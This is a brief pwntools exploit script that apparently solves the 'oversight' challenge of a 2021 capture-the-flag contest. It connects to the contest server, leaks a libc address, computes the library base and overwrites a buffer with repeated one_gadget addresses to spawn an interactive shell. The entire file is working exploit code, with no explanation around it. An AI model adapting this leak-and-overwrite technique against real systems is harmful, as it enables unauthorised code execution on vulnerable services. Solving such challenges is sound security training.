from pwn import *
#p=process('./oversight')
p=remote('pwn-2021.duc.tf',31909)
elf = ELF('./oversight')
#raw_input("DEBUG")

p.sendlineafter("Press enter to continue\n", "26")

p.recvuntil("number is: ")
leak = int(("0x" +p.recv(12)),16) 
base = leak - 0x3ec7e3
log.info("base: " + hex(base))
#0x4f3d5 0x4f432 0x10a41c
one_gadget = base + 0x4f3d5
log.info("one_gadget: " + hex(one_gadget))
p.sendlineafter("read (max 256)? ",str(256))
payload = p64(one_gadget)*32
p.sendline(payload)


p.interactive()
